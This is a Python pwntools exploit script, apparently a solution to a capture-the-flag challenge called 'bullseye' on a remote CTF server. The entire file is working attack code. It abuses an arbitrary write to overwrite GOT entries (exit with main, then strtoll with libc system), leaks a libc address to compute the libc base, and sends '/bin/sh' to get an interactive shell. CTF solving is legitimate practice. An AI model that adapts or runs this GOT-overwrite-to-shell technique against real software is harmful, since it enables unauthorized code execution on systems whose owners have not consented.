# no explanation needed trivial challenge...

from pwn import *
import time
ret = 0x00000000000256b9
main = "401260"
exit_got = "404058"
strtoll_got = "404040"
sleep_got = "404060"
#p = process("./bullseye")
p = remote("jh2i.com",50031)
p.recvuntil("write to?\n")
p.sendline(exit_got)
p.recvuntil("to write?\n")
p.sendline(main)
time.sleep(15)
data = p.recvline()
p.recv(8000)
leak = int(data,16)
print "leak: ",hex(leak)
base = leak - 0x00000000000e5be0
libc_ret = base + ret
system = base + 0x00000000000554e0
print "base: ",hex(base)
p.sendline(strtoll_got)
p.sendline(hex(system).replace("0x",""))
p.sendline("/bin/sh\x00")
p.interactive()
